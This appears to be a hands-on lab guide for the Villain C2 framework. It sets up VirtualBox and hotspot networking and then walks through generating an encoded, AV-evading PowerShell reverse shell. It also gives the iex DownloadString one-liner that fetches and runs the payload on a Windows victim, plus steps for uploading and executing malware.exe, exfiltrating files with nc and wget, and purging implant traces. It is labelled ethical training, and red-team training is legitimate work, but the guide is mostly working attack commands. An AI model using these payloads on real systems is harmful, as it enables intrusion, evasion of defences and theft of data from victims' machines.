# Simple Villain Framework Lab Guide

# 1. VirtualBox Kali VM & Real-World Networking Setup

## 🧩 Prerequisites

```markdown
- VirtualBox installed on Host (Windows or Linux)
- Kali Linux VM installed
- VirtualBox Extension Pack (optional but recommended)
- Administrator access on both host and guest
- Mobile hotspot capability for simulation
```

---

##  Part 1: Host-Only Adapter Networking (VirtualBox)

###  Step 1: Configure Adapter 2 Before Starting Kali VM

```markdown
1. Open VirtualBox Manager
2. Select your Kali Linux VM → Click Settings
3. Go to the Network tab
4. Enable Adapter 2:
   - Enable Network Adapter (checked)
   - Attached to: Host-Only Adapter
5. Select the host-only network (e.g., VirtualBox Host-Only Ethernet Adapter)
```

###  Step 2: Identify Network Adapters on Host & Kali

#### On Host (Windows):
```bash
ipconfig
```

#### On Kali VM:
```bash
ip a
```

> ✅ You should see a new interface like `eth1` or `enp0s8` (depending on VirtualBox config)

###  Step 3: Ensure Both Are on the Same Subnet

```markdown
Example:
- Windows Host IP: 192.168.56.1
- Kali VM IP: 192.168.56.101
```

>  Make sure both IPs fall within the same subnet range like `192.168.56.0/24`

###  Step 4: Test Connectivity

#### From Host to Kali:
```bash
ping 192.168.56.101
```

#### From Kali to Host:
```bash
ping 192.168.56.1
```

> ✔ If both are reachable, host-only networking is correctly configured.

---

##  Part 2: Real-World Payload Delivery via Mobile Hotspot

###  Objective
Simulate real-world payload delivery by connecting two physical PCs (Attacker and Victim) over a common mobile hotspot.

###  Step 1: Connect Both PCs to Mobile Hotspot

```markdown
1. Turn on mobile hotspot on your smartphone
2. Connect both Attacker and Victim laptops to the hotspot
3. Use terminal or CLI to verify both systems are in the same subnet
```

#### On Both PCs:
```bash
# Windows
ipconfig

# Linux/Kali
ifconfig
```

#### IP Confirmation:
```markdown
- Attacker IP: 192.168.43.120
- Victim IP: 192.168.43.101
```

> ✅ Same subnet confirmed

---

Use this guide for setting up practical labs or red team exercises. For ethical hacking training only. Contact your admin before using in any production or personal environment.

---




## 2. Prepare Kali Attacker

1. **Update & upgrade**:

   ```bash
   sudo apt update && sudo apt upgrade -y
   ```
2. **Clone Villain**:

   ```bash
   git clone https://github.com/keralahacker/Villain.git
   cd Villain
   ```

   > If GitHub is blocked (e.g. college Wi‑Fi), use a VPN or your phone’s hotspot.
3. **Install Python deps**:

   ```bash
   python3 -m venv venv
   source venv/bin/activate
   pip3 install -r requirements.txt
   ```
   ```bash
   sudo pip3 install -r requirements.txt --break-system-packages
   ```
   If it fails, skip to next step.
4. **Start Villain**:

   ```bash
   python3 Villain.py
   ```

   You’ll see the `villain>` prompt.

---

## 3. Build & Deliver Your Payload

### 3.1 Generate the reverse shell

```
villain> generate payload=<OS/handler/template> lhost=<YOUR_IP_or_interface> [encode|obfuscate]
```

| Element       | Meaning                      | Example                   |
| ------------- | ---------------------------- | ------------------------- |
| `OS`          | Target OS family             | `windows`                 |
| `handler`     | Connection type              | `reverse_tcp` (stable)    |
| `template`    | Payload script               | `powershell`              |
| `lhost`       | Your Kali IP or interface    | `192.168.56.10` or `eth0` |
| `[encode]`    | Simple Base64-style encoding | optional (helps evade AV) |
| `[obfuscate]` | String-twisting for stealth  | optional                  |

**Example:**

```bash
villain> generate payload=windows/reverse_tcp/powershell lhost=192.168.56.10 encode
```

This writes `payload.ps1` for the Windows VM.

### 3.2 Host & run the payload

1. **On Kali**, serve it over HTTP:

   ```bash
   cp Core/payloads/windows/reverse_tcp/powershell.ps1 ~/payload.ps1
   cd ~
   python3 -m http.server 8000
   ```
2. **On Windows 10** (PowerShell as Admin):

   ```powershell
   iex (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8000/payload.ps1')
   ```

   This runs the reverse shell back to Kali.

---

## 4. Catch & Use Your Shell

1. **List sessions**:

   ```bash
   villain> sessions
   ```
2. **Enter the shell**:

   ```bash
   villain> shell <SESSION_ID>
   ```

   You get a `PS C:\>` prompt. Use `exit` or Ctrl+C to return.

---

## 5. Uploading Files to the Victim

```
villain> upload <local_path_on_kali> <remote_path_on_windows>
```

* **Example:**

  ```bash
  villain> upload /home/kali/tools/malware.exe C:\Users\Public\malware.exe
  ```
* Then inside your shell:

  ```powershell
  PS C:\> & 'C:\Users\Public\malware.exe'
  ```

---

## 6. Downloading Files from the Victim

Villain has no built-in “download,” but you can exfiltrate:

1. **On Kali**, listen:

   ```bash
   nc -lvp 9001 > secret.txt
   ```
2. **In Windows shell:**

   ```powershell
   PS C:\> nc 192.168.56.10 9001 < C:\Users\Public\secret.txt
   ```

Alternatively, spin up an HTTP server on Windows:

```powershell
PS C:\Users\Public> python3 -m http.server 8000
```

Then on Kali:

```bash
wget http://192.168.56.20:8000/secret.txt -O secret.txt
```

---

## 7. Cleaning Up & Tips

* **flee**: Exit without killing sessions:

  ```bash
  villain> flee
  ```
* **purge**: Wipe saved implant metadata:

  ```bash
  villain> purge
  ```

**Pro Tips:**

* Verify your **lhost** and subnet before generating.
* Use `backdoors` to list re-usable payloads.
* Keep Kali’s firewall off on the lab network.

---

## 8. Broadcast Messages with `#`

You can send a chat message to all connected sibling servers by prefixing with `#`:

```bash
villain> # Hey team, switch to backup C2 channel
```

---

That’s the full lab: network setup, payload gen, shell, file IO, and messaging. Enjoy your ethical testing!
